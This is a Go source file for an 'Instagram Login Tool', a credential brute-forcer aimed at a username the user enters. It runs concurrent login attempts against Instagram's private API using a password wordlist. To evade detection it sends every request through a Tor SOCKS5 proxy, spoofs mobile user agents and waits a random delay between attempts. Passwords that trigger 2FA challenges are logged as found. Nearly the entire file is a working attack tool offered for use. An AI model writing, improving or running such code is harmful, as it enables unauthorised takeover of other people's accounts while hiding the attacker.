package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
        "io/ioutil"
	"golang.org/x/net/proxy"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

var userAgents = []string{
	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

type LoginResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Time     string `json:"time"`
	Message  string `json:"message"`
}

func main() {

        res, _ := http.Get("https://api.ipify.org")
        ip, _ := ioutil.ReadAll(res.Body)
        os.Stdout.Write(ip)
//////////////////////////////////////////
	setupLogger()
	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("coded by: %s\n\n", CURRENT_USER)

	username := getUsername()
	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt or password.json!")
		return
	}
	fmt.Printf("\nLoaded %d passwords\n", len(passwords))

	fmt.Println("\nStarting login attempts...\n")
	found := make(chan LoginResult, 1)
	progress := make(chan int, len(passwords))
	var wg sync.WaitGroup

	workerCount := 5
	jobs := make(chan string, len(passwords))
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for password := range jobs {
				res := tryLogin(username, password)
				progress <- 1
				if res.Success {
					select {
					case found <- res:
					default:
					}
					return
				}
				time.Sleep(randomDuration(5, 10))
			}
		}()
	}

	go func() {
		for _, password := range passwords {
			jobs <- password
		}
		close(jobs)
	}()

	go showProgressBar(len(passwords), progress)

	select {
	case res := <-found:
		fmt.Printf("\n✅ PASSWORD FOUND: %s\n", res.Password)
		fmt.Printf("Username: %s\n", username)
		fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
		saveResultJSON(res)
	case <-waitGroupTimeout(&wg, 60*time.Minute):
		fmt.Println("\n❌ No valid password found in the given time.")
		saveResultJSON(LoginResult{
			Username: username,
			Password: "",
			Success:  false,
			Time:     CURRENT_TIME,
			Message:  "Not found",
		})
	}
}

func setupLogger() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
	}
}

func getUsername() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Instagram username: ")
	username, _ := reader.ReadString('\n')
	return trim(username)
}

func showProgressBar(total int, progress <-chan int) {
	completed := 0
	for range progress {
		completed++
		printProgress(completed, total)
	}
}

func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{} {
	done := make(chan struct{})
	go func() {
		c := make(chan struct{})
		go func() {
			wg.Wait()
			close(c)
		}()
		select {
		case <-c:
		case <-time.After(timeout):
		}
		close(done)
	}()
	return done
}

// This function now uses Tor SOCKS5 proxy for HTTP requests.
func tryLogin(username, password string) LoginResult {
	loginUrl := API_URL + "accounts/login/"
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	// Set up Tor SOCKS5 proxy
	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
	if err != nil {
		log.Printf("Failed to obtain Tor SOCKS5 proxy: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Tor SOCKS5 proxy error"}
	}
	transport := &http.Transport{Dial: dialer.Dial}
	client := &http.Client{
		Transport: transport,
		Timeout:   TIMEOUT,
	}

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Request error"}
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "HTTP error"}
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Read error"}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Parse error"}
	}

	success := response.Status == "ok" || strings.Contains(string(body), "logged_in_user")

	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
		return LoginResult{Username: username, Password: password, Success: true, Time: CURRENT_TIME, Message: "challenge or success"}
	}

	msg := response.Message
	if response.ErrorType == "bad_password" {
		msg = "invalid password"
	}
	if response.ErrorType == "invalid_user" {
		msg = "invalid username"
	}
	return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: msg}
}

func loadPasswords() []string {
	var passwords []string

	file, err := os.Open("password.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pass := strings.TrimSpace(scanner.Text())
			if pass != "" {
				passwords = append(passwords, pass)
			}
		}
	} else {
		log.Printf("Error opening password file: %v", err)
	}

	fileJSON, errj := os.Open("password.json")
	if errj == nil {
		defer fileJSON.Close()
		var jsonPasswords []string
		decoder := json.NewDecoder(fileJSON)
		if err := decoder.Decode(&jsonPasswords); err == nil {
			passwords = append(passwords, jsonPasswords...)
		}
	}

	return passwords
}

func saveResultJSON(result LoginResult) {
	file, err := os.OpenFile("results.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	enc := json.NewEncoder(file)
	err = enc.Encode(result)
	if err != nil {
		log.Printf("Error encoding result: %v", err)
	}
}

func trim(s string) string {
	return strings.TrimSpace(s)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}

func printProgress(current, total int) {
	percent := (current * 100) / total
	bar := strings.Repeat("█", percent/2) + strings.Repeat("-", 50-percent/2)
	os.Stdout.WriteString(
		"\r[" + bar + "] " +
			fmt.Sprintf(" %d/%d ", current, total) +
			fmt.Sprintf(" %d%%", percent))
	if current == total {
		os.Stdout.WriteString("\n")
	}
}

func randomDuration(min, max int) time.Duration {
	return time.Duration(rand.Intn(max-min+1)+min) * time.Second
}
